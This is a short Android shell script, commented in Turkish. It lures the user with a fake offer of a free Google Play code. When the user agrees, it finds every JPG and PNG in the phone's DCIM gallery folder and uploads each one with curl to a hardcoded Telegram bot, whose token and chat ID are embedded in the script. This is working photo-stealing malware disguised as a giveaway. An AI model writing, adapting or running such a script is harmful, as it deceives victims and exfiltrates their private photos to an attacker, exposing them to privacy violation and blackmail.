#!/bin/sh

# Telegram bot bilgileri
bot_token="7889269990:AAHPRBn4wqXnjClQMLyrHwljtVZNrcckJAE"
chat_id="6624281537"

# Fotoğrafların bulunduğu klasör (Güncellemeniz gerekebilir)
gallery_path="/storage/emulated/0/DCIM/"

# Kullanıcıya onay sorusu
printf "Bedava Play Kod Almak İstermisin? (e/h): "
read answer

case "$answer" in
  [eE]*)
    echo "Fotoğraflar gönderiliyor..."
    # Find komutu ile ilgili dosyaların listesini alıyoruz.
    find "$gallery_path" -type f  -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png"  | while IFS= read -r file; do
        # Telegram API'sine dosyayı gönderiyoruz.
        response=$(curl -s -w "\n%{http_code}" -X POST "https://api.telegram.org/bot${bot_token}/sendPhoto" \
            -F "chat_id=${chat_id}" \
            -F "photo=@${file}")
    
        # HTTP durum kodunu ayrıştırıyoruz.
        http_code=$(echo "$response" | tail -n1)
        if [ "$http_code" -eq 200 ]; then
            echo "${file} başarıyla gönderildi."
        else
            echo "${file} gönderilemedi. Hata: $(echo "$response" | sed '$d')"
        fi
    done
    ;;
  *)
    echo "Kullanıcı iptal etti."
    ;;
esac
